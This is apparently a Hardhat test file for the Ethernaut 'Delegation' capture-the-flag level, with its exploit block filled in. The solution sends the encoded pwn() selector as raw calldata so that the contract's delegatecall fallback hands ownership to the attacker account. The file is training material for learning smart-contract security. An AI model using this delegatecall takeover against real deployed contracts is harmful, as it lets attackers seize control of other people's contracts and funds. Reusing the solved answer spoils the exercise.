const { ethers } = require("hardhat");
const { expect } = require("chai");

/*

The goal of this level is for you to claim ownership of the instance you are given.

  Things that might help

- Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
- Fallback methods
- Method ids

*/

describe("[Challenge] Delegation", function () {
  let deployer, attacker;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    this.delegate = await (
      await ethers.getContractFactory("Delegate", deployer)
    ).deploy(deployer.address);

    expect(await this.delegate.owner()).to.eq(deployer.address);

    this.delegation = await (
      await ethers.getContractFactory("Delegation", deployer)
    ).deploy(this.delegate.address);
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */

    let ABI = ["function pwn()"];
    let iface = new ethers.utils.Interface(ABI);
    let signature = iface.encodeFunctionData("pwn", []);

    await attacker.sendTransaction({
      to: this.delegation.address,
      data: signature,
    });
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Attacker claim ownership of the contract
    expect(await this.delegation.owner()).to.eq(attacker.address);
  });
});
